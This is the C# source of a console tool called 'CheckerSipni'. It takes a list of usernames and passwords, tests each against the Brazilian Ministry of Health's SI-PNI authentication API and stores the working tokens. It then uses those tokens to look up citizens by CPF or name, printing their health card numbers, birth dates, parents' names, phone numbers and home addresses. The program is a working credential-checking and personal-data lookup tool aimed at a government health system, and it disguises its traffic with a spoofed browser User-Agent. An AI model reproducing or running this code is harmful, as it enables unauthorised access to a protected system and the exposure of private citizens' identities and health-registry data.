/*
 * DESENVOLVIDO POR João H.
 * Versao do SI-PNI para sistemas sem interface grafica
 * Ética sempre (:
*/

using System.Net.Http.Headers;
using System.Text;
using System.Text.Json;
using System.Web;
using static CheckerSipni.Models.RespostasModel;
using Lolcat;
using Spectre.Console;

namespace CheckerSipni
{
    class Program
    {
        static string tokensFilePath = "tokens.txt";
        static string loginsFilePath = "logins.txt";
        static RainbowStyle style = new RainbowStyle();
        static Rainbow rainbow = new Rainbow(style);
        static string APITOKEN = "https://servicos-cloud.saude.gov.br/pni-bff/v1/autenticacao/tokenAcesso";
        static string APICONSULTACPF = "https://servicos-cloud.saude.gov.br/pni-bff/v1/cidadao/cpf";
        static HttpClient Client = new HttpClient();
        static string ASCIIART = @"
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣤⣤⣶⠶⠶⠶⠶⠶⠶⠶⢖⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⡞⠁⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠈⠹⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⠋⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣦⣀⠀⠀⠀⠈⢿⣄⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡾⠁⠀⣠⡾⢁⣾⡿⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣆⠹⣦⠀⠀⢻⣆⠀⠀⠀⠀
⠀⠀⢀⡾⠁⢀⢰⣿⠃⠾⢋⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⠀⢹⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡌⠻⠆⢿⣧⢀⠀⢻⣆⠀⠀⠀
⠀⠀⣾⠁⢠⡆⢸⡟⣠⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣦⡸⣿⠀⣆⠀⢿⡄⠀⠀
⠀⢸⡇⠀⣽⡇⢸⣿⠟⢡⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣉⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠙⢿⣿⠀⣿⡀⠘⣿⠀⠀
⡀⣿⠁⠀⣿⡇⠘⣡⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⣦⡙⠀⣿⡇⠀⢻⡇⠀
⢸⡟⠀⡄⢻⣧⣾⡿⢋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣴⣿⠉⡄⢸⣿⠀
⢾⡇⢰⣧⠸⣿⡏⢠⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠀⠓⢶⠶⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣆⠙⣿⡟⢰⡧⠀⣿⠀
⣸⡇⠰⣿⡆⠹⣠⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣶⣿⡏⠀⠠⢺⠢⠀⠀⣿⣷⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠸⠁⣾⡇⠀⣿⠀
⣿⡇⠀⢻⣷⠀⣿⡿⠰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡅⠀⠀⢸⡄⠀⠀⣿⣿⣿⣿⣿⣿⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡆⣰⣿⠁⠀⣿⠀
⢸⣧⠀⡈⢿⣷⣿⠃⣰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣇⠀⢀⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣸⡀⢿⣧⣿⠃⡀⢸⣿⠀
⠀⣿⡀⢷⣄⠹⣿⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⣿⣿⠀⣼⣿⣿⣿⣿⣿⣿⣿⡯⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⢸⡟⢁⣴⠇⣼⡇⠀
⠀⢸⡇⠘⣿⣷⡈⢰⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⣿⣿⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢰⣿⡧⠈⣴⣿⠏⢠⣿⠀⠀
⠀⠀⢿⡄⠘⢿⣿⣦⣿⣯⠘⣆⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⡎⢸⣿⣣⣾⡿⠏⠀⣾⠇⠀⠀
⠀⠀⠈⢷⡀⢦⣌⠛⠿⣿⡀⢿⣆⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢀⣿⡁⣼⡿⠟⣉⣴⠂⣼⠏⠀⠀⠀
⠀⠀⠀⠈⢷⡈⠻⣿⣶⣤⡁⠸⣿⣆⠡⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢀⣾⡟⠀⣡⣴⣾⡿⠁⣴⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢿⣄⠈⢙⠿⢿⣷⣼⣿⣦⠹⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⢡⣾⣿⣶⣿⠿⢛⠉⢀⣾⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⣧⡀⠳⣦⣌⣉⣙⠛⠃⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠐⠛⠋⣉⣉⣤⡶⠁⣰⡿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⡀⠙⠛⠿⠿⠿⠿⠟⠛⠛⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠙⠟⠛⠿⠿⠿⠿⠟⠛⠁⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢶⣄⠙⠶⣦⣤⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⡶⠖⣁⣴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⡉⠉⠉⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠉⠉⠉⠉⣡⣴⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠷⢦⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣠⣴⠶⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠋⠉⠁";

        static async Task Main()
        {
            Console.Clear();
            rainbow.WriteLineWithMarkup(ASCIIART);

            var tokens = new List<CredentialToken>();
            if (!File.Exists("tokens.txt") || File.ReadAllLines(tokensFilePath).Length == 0)
            {
                rainbow.WriteLineWithMarkup("[*] Arquivo 'tokens.txt'. Checando logins e gerando token valido...");
                tokens = await GerarTokenValido();
            }

            await Menu(tokens);
        }

        static void Resultado(Root dados)
        {
            if (dados != null && dados.records != null && dados.records.Count > 0)
            {
                foreach (var dado in dados.records)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("=====================================");
                    Console.WriteLine($"NOME: {dado.nome ?? "N/A"}");
                    Console.WriteLine($"CPF: {dado.cpf ?? "N/A"}");
                    Console.WriteLine($"GENERO: {dado.sexo ?? "N/A"}");
                    Console.WriteLine($"UF: {dado.endereco.siglaUf ?? "N/A"}");
                    Console.WriteLine($"MUNICIPIO: {dado.endereco.municipio ?? "N/A"}");
                    //Console.WriteLine($"MUNICIPIO: {dado.municipio}");
                    Console.WriteLine($"CNS: {dado.cnsDefinitivo ?? "N/A"}");
                    Console.WriteLine($"NASCIMENTO: {dado.dataNascimento ?? "N/A"}");
                    Console.WriteLine($"MAE: {dado.nomeMae ?? "N/A"}");
                    Console.WriteLine($"PAI: {dado.nomePai ?? "N/A"}");
                    Console.WriteLine($"TELEFONE(S): {(dado.telefone != null && dado.telefone.Any() ? string.Join(", ", dado.telefone) : "N/A")}");
                    Console.WriteLine($"ENDEREÇO: UF = {dado.endereco?.siglaUf ?? "N/A"}, BAIRRO = {dado.endereco?.bairro ?? "N/A"}, NUMERO = {dado.endereco?.numero ?? "N/A"}, CEP = {dado.endereco?.cep ?? "N/A"}, COMPLEMENTO = {dado.endereco?.complemento ?? "N/A"}");
                    Console.WriteLine("=====================================\n");
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[!] ATENCAO: Nenhum dado encontrado. Tente mudar de credencial.\n");
            }
        }

        static async Task Menu(List<CredentialToken> credentialTokens)
        {
            if (credentialTokens.Count == 0)
            {
                var tokensLines = File.ReadAllLines(tokensFilePath);
                credentialTokens.AddRange(tokensLines.Select(line =>
                {
                    var parts = line.Split(":");
                    return new CredentialToken(parts[0], parts[2]);
                }));
            }

            while (true)
            {
                Console.Clear();
                rainbow.WriteLineWithMarkup(ASCIIART);
                Console.WriteLine("======== MENU ========");
                rainbow.WriteLineWithMarkup("1. Consulta por Nome");
                rainbow.WriteLineWithMarkup("2. Consulta por CPF");
                rainbow.WriteLineWithMarkup("3. Regenerar tokens");
                rainbow.WriteLineWithMarkup("0. Sair");
                Console.WriteLine("======================");
                Console.Write("Escolha uma opção: ");

                if (int.TryParse(Console.ReadLine(), out int option))
                {
                    switch (option)
                    {
                        case 1:

                            Console.WriteLine("Escolha uma credencial:");
                            for (int i = 0; i < credentialTokens.Count; i++)
                            {
                                rainbow.WriteLineWithMarkup($"{i + 1}. {credentialTokens[i].Credential}");
                            }
                            Console.Write("Selecionar credencial: ");
                            if (int.TryParse(Console.ReadLine(), out int index) && index > 0 && index <= credentialTokens.Count)
                            {
                                var token = credentialTokens[index - 1].Token;
                                await ConsultaPorNome(token);
                            }
                            else
                            {
                                Console.WriteLine("Credencial invalida.");
                            }
                            break;
                        case 2:
                            Console.WriteLine("Escolha uma credencial:");
                            for (int i = 0; i < credentialTokens.Count; i++)
                            {
                                rainbow.WriteLineWithMarkup($"{i + 1}. {credentialTokens[i].Credential}");
                            }
                            Console.Write("Selecionar credencial: ");
                            if (int.TryParse(Console.ReadLine(), out index) && index > 0 && index <= credentialTokens.Count)
                            {
                                var token = credentialTokens[index - 1].Token;
                                await ConsultaPorCPF(token);
                            }
                            else
                            {
                                Console.WriteLine("Credencial invalida.");
                            }
                            break;
                        case 3:
                            rainbow.WriteLineWithMarkup("[*] Gerando tokens novos...");
                            await GerarTokenValido();
                            break;
                        case 0:
                            Environment.Exit(0);
                            break;
                        default:
                            Console.WriteLine("Opcao invalida.");
                            break;
                    }
                }
                else
                {
                    Console.WriteLine("Entrada invalida, tente novamente.");
                }
                Console.WriteLine("Tecle enter para voltar...");
                Console.ReadLine();
            }
        }

        static async Task<List<CredentialToken>> GerarTokenValido()
        {
            File.Delete(tokensFilePath);
            var lines = File.ReadLines(loginsFilePath);
            var credentialTokens = new List<CredentialToken>();
            credentialTokens.Clear();

            foreach (var credential in lines)
            {
                var token = await CheckLogins(new List<string> { credential });
                if (!string.IsNullOrWhiteSpace(token))
                {
                    File.AppendAllText(tokensFilePath, $"{credential}:{token}{Environment.NewLine}");
                    credentialTokens.Add(new CredentialToken(credential, token));
                }
            }

            return credentialTokens;
        }

        static async Task<string> CheckLogins(List<string> credentials)
        {
            foreach (var credential in credentials)
            {
                try
                {
                    Client.DefaultRequestHeaders.Clear();
                    var loginBytes = Encoding.ASCII.GetBytes(credential);
                    var encodedLogin = Convert.ToBase64String(loginBytes);

                    Client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71");
                    Client.DefaultRequestHeaders.Add("X-Authorization", $"Basic {encodedLogin}");

                    var response = await Client.PostAsync(APITOKEN, null);
                    var json = await response.Content.ReadAsStringAsync();
                    if (response.IsSuccessStatusCode)
                    {
                        rainbow.WriteLineWithMarkup($"[ONLINE] {credential}");
                        LoginToken logintoken = JsonSerializer.Deserialize<LoginToken>(json);
                        return logintoken.accessToken;
                    }
                    else
                    {
                        rainbow.WriteLineWithMarkup($"[OFFLINE] {credential}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] ERRO: {ex.Message}");
                }
            }

            return string.Empty;
        }

        static async Task ConsultaPorNome(string tokenValido)
        {

            Console.Write("Nome: ");
            var nome = Console.ReadLine();
            Console.Write("Codigo Municipio: ");
            var codMun = Console.ReadLine();

            if (codMun.Length == 7)
            {
                codMun = codMun.Substring(0, codMun.Length - 1);
            }

            if (!string.IsNullOrWhiteSpace(nome) && !string.IsNullOrWhiteSpace(codMun))
            {
                Console.WriteLine("[*] Buscando dados...");
                var resultado = await ConsultaNome(tokenValido, nome, codMun);
                Console.Clear();
                rainbow.WriteLineWithMarkup(ASCIIART);
                Resultado(resultado);
            }
            else
            {
                Console.WriteLine("Nome ou codigo do municipio nao pode estar vazio.");
                Console.ReadLine();
            }
        }

        static async Task<Root> ConsultaNome(string bearerToken, string nome, string codMun)
        {
            try
            {
                Client.DefaultRequestHeaders.Clear();
                Client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71");
                Client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", bearerToken);

                nome = HttpUtility.UrlEncode(nome);
                var response = await Client.GetAsync($"https://servicos-cloud.saude.gov.br/pni-bff/v1/cidadao?nome={nome}&municipioNascimento={codMun}");
                if ((int)response.StatusCode == 400)
                {
                    Console.WriteLine("[-] ERRO: Dado(s) Invalido(s)!");
                    Console.ReadLine();
                    return null;
                }

                var json = await response.Content.ReadAsStringAsync();
                if (!response.IsSuccessStatusCode)
                {
                    rainbow.WriteLineWithMarkup("[*] Tokens expirados, gerando tokens novos...");

                    try
                    {
                        var credentialTokens = await GerarTokenValido();
                        await Menu(credentialTokens);
                    }
                    catch (Exception ex)
                    {
                        rainbow.WriteLineWithMarkup($"[-] ERRO: ao gerar novos tokens: {ex.Message}");
                    }
                }

                Root root = JsonSerializer.Deserialize<Root>(json);
                return root;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] ERRO: {ex.Message}");
                return null;
            }
        }

        static async Task ConsultaPorCPF(string tokenValido)
        {
            Console.Write("CPF: ");
            var cpf = Console.ReadLine();
            if (!string.IsNullOrWhiteSpace(cpf))
            {
                Console.WriteLine("[*] Buscando dados...");
                var resultado = await ConsultaCPF(tokenValido, cpf);
                Console.Clear();
                rainbow.WriteLineWithMarkup(ASCIIART);
                Resultado(resultado);
            }
            else
            {
                Console.WriteLine("O cpf nao pode estar vazio.");
                Console.ReadLine();
            }
        }

        static async Task<Root> ConsultaCPF(string bearerToken, string cpf)
        {
            try
            {
                Client.DefaultRequestHeaders.Clear();
                Client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71");
                Client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", bearerToken);

                var response = await Client.GetAsync($"{APICONSULTACPF}/{cpf}");
                if ((int)response.StatusCode == 400)
                {
                    Console.WriteLine("[-] ERRO: CPF Invalido!");
                    Console.ReadLine();
                    return null;
                }

                var json = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[DEBUG] {json}");
                if (!response.IsSuccessStatusCode)
                {
                    rainbow.WriteLineWithMarkup("[*] Tokens expirados, gerando tokens novos...");

                    try
                    {
                        var credentialTokens = await GerarTokenValido();
                        await Menu(credentialTokens);
                    }
                    catch (Exception ex)
                    {
                        rainbow.WriteLineWithMarkup($"[-] ERRO: ao gerar novos tokens: {ex.Message}");
                    }
                }

                Root root = JsonSerializer.Deserialize<Root>(json);
                return root;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] ERRO: {ex.Message}");
                return null;
            }
        }
    }
}
